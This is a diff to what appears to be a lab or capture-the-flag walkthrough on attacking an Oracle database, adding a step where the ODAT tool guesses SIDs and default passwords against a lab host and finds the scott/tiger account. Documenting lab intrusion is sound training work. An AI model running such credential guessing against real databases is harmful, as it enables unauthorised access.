@@ -141,7 +141,20 @@ root@kali:/opt/odat-libc2.5-i686# odat sidguesser -s 10.10.10.82
 [+] SIDs found on the 10.10.10.82:1521 server: XE,XEXDB 
 ```
 
-### 
+#### identify users:
+
+```text
+./odat-libc2.12-x86_64 passwordguesser -s 10.10.10.82 -d XE --accounts-file accounts/default.txt
+
+[1] (10.10.10.82:1521): Searching valid accounts on the 10.10.10.82 server, port 1521
+[+] Valid credentials found: scott/tiger. Continue...                                   ##################################################################                                         | ETA:  00:00:05 
+100% |#############################################################################################################################################################################################| Time: 00:00:24 
+[+] Accounts found on 10.10.10.82:1521/XE: 
+scott/tiger
+
+```
+
+**use the the wordlist below for just the default accounts**
 
 ### Metasploit
 
